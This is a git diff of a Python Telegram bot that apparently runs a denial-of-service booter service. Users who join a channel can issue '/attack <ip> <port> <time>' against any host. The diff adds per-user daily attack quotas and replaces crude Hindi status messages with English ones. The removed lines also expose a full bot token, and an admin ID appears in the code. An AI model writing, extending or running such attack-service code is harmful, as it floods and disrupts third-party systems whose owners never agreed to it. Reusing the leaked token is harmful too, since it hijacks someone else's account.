@@ -3,9 +3,10 @@ import time
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 import os
+from datetime import datetime, timedelta
 
 # Configuration
-TELEGRAM_BOT_TOKEN = ("7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4")  # Fetch token from environment variable
+TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')  # Fetch token from environment variable
 ADMIN_USER_ID = 1662672529
 APPROVED_IDS_FILE = 'approved_ids.txt'
 CHANNEL_ID = "@jsbananannanan"  # Replace with your channel username
@@ -13,6 +14,12 @@ attack_in_progress = False
 
 # A dictionary to store the last attack timestamp for each user
 user_cooldowns = {}
+
+# A dictionary to track attack usage per user (user_id -> (count, last_used_timestamp))
+user_attack_counts = {}
+
+# Max attacks per day
+MAX_ATTACKS_PER_DAY = 3
 
 # Cooldown period in seconds (150 seconds)
 COOLDOWN_TIME = 150
@@ -156,33 +163,44 @@ async def attack(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
         return
 
-    # Check if the user is within the cooldown period
-    current_time = time.time()  # Get the current time in seconds
-    last_attack_time = user_cooldowns.get(user_id, 0)
+    # Get the current time
+    current_time = time.time()
 
-    if current_time - last_attack_time < COOLDOWN_TIME:
-        remaining_time = COOLDOWN_TIME - (current_time - last_attack_time)
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Please wait {int(remaining_time)} seconds before you can attack again.*", parse_mode='Markdown')
-        return
+    # Check if the user has used the attack command today
+    if user_id in user_attack_counts:
+        count, last_used = user_attack_counts[user_id]
 
-    if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait for the current attack to finish.*", parse_mode='Markdown')
-        return
+        # Reset if it's a new day (more than 24 hours have passed since the last usage)
+        if current_time - last_used > 86400:  # 86400 seconds = 24 hours
+            count = 0  # Reset the count after 24 hours
 
+        if count >= MAX_ATTACKS_PER_DAY:
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"*⚠️ You have already used the attack command {MAX_ATTACKS_PER_DAY} times today. Please try again tomorrow.*",
+                parse_mode='Markdown'
+            )
+            return
+    else:
+        # If the user hasn't attacked today, initialize their count
+        user_attack_counts[user_id] = (0, current_time)
+
+    # If enough arguments are provided (ip, port, and time)
     if len(args) != 3:
         await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
         return
 
     ip, port, time_duration = args
+
+    # Proceed with the attack process
     await context.bot.send_message(chat_id=chat_id, text=(
-        f"*✅ ATTACK LAG GAYA ANDHAA HAI KYA LAUDE✅*\n\n"
-        f"*🎯 TARGET CHUT:* {ip}\n"
-        f"*🔌 LAND KHADA HAI:* {port}\n"
-        f"*⏱ NIKAL GAYA KYA:* {time_duration} seconds\n"
+        f"*✅ ATTACK STARTED ON TARGET:* {ip}\n"
+        f"*🎯 TARGET PORT:* {port}\n"
+        f"*⏱ ATTACK TIME:* {time_duration} seconds\n"
     ), parse_mode='Markdown')
 
-    # Update the last attack timestamp for this user
-    user_cooldowns[user_id] = current_time
+    # Update the count and last used timestamp
+    user_attack_counts[user_id] = (count + 1, current_time)
 
     # Run the attack process
     asyncio.create_task(run_attack(chat_id, ip, port, time_duration, context))
@@ -210,8 +228,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     finally:
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*♥️ CHUDAYI KHATAM HO GAYA  ♥️*\n"
-        "*FEEDBACK SEND KAR LAUDE*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*♥️ ATTACK COMPLETED ♥️*\n*Feedback appreciated!*", parse_mode='Markdown')
 
 # Main Function
 def main():
